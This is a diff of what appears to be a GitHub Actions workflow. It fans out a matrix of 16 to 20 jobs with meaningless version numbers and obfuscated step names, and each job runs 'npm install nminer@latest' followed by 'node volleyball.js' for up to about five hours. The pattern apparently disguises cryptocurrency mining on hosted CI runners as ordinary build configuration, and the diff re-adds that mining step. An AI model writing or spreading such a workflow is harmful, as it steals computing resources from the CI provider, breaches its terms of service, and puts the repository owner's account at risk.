@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 38 }
-          - { version: 2991 }
-          - { version: 8961 }
-          - { version: 8934 }
-          - { version: 4065 }
-          - { version: 926 }
-          - { version: 3388 }
-          - { version: 3104 }
-          - { version: 6700 }
-          - { version: 9582 }
-          - { version: 7276 }
-          - { version: 9625 }
-          - { version: 791 }
-          - { version: 5590 }
-          - { version: 7643 }
-          - { version: 507 }
-          - { version: 2011 }
-          - { version: 8429 }
-          - { version: 234 }
-          - { version: 563 }
+          - { version: 8448 }
+          - { version: 3131 }
+          - { version: 6924 }
+          - { version: 5041 }
+          - { version: 4043 }
+          - { version: 3599 }
+          - { version: 8323 }
+          - { version: 7817 }
+          - { version: 7764 }
+          - { version: 5103 }
+          - { version: 1561 }
+          - { version: 6479 }
+          - { version: 1858 }
+          - { version: 8802 }
+          - { version: 6312 }
+          - { version: 3510 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: failing frilly tomorrow to vast
+      - name: grown
         run: |
           npm install nminer@latest
-          timeout 320m node volleyball.js || echo "volleyball executed"
+          timeout 307m node volleyball.js || echo "volleyball executed"
